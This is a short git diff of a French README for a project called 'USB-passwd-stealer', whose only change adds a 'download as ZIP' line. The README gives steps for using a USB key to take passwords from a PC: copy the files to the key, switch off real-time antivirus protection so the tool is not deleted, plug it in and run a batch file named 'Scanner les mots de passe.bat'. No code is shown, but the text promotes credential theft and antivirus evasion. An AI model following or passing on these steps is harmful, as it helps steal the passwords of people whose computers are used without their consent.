@@ -1,6 +1,6 @@
 # USB-passwd-stealer
 Clé Usb récupérateur de mots de passe, facile.
-
+⚠ TELECHARGER EN ZIP⚠
 Vous devez tous télécharger et tous mettre dans votre clé usb a la racine ou dans un même fichier.
 (ENLEVER LA PROTECTION EN TEMPS REEL) sinon tout est supprimer.
 brancher la clé usb sur un pc et lancez le fichier .bat Scanner les mots de passe.bat
